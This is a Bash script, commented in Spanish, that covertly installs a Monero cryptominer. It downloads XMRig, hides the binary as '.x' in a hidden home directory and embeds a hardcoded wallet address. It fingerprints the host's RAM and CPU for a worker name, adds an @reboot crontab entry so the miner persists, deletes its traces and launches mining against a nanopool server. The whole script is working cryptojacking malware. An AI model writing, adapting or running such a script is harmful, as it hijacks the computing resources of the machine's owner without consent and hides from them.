#!/bin/bash

# Obtener el nombre de usuario actual
USUARIO=$(whoami)

# Descargar xmrig a /tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz

# Descomprimir xmrig en /tmp
tar -xzvf /tmp/xmrig.tar.gz -C /tmp

mkdir $HOME/.xconfig

# Copiar el minero al directorio oculto
cp /tmp/xmrig-6.21.3/xmrig $HOME/.xconfig/.x

# Definir la variable con un valor inicial
billetera="45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P/"

# Obtener información del sistema de manera segura
RAM=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}')
CPU=$(top -bn1 2>/dev/null | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print $1}')

# Verificar si las variables RAM y CPU no están vacías antes de generar el nombre de usuario
if [ -n "$RAM" ] && [ -n "$CPU" ]; then
    # Generar nombre de usuario basado en las propiedades del sistema
    NOMBRE_USUARIO="${USUARIO}_RAM${RAM}_CPU${CPU}"
    # Agregar el nombre de usuario a la variable
    variable="$billetera/$NOMBRE_USUARIO"
fi

# Crear el script de inicio en el directorio oculto


# Hacer ejecutables los archivos ocultos
chmod 777 $HOME/.xconfig/.x

# Agregar tarea de cron
(crontab -l 2>/dev/null; echo "@reboot $HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B") | crontab -

# Limpiar archivos temporales
rm /tmp/xmrig.tar.gz
rm -rf /tmp/xmrig-6.21.3
$HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B
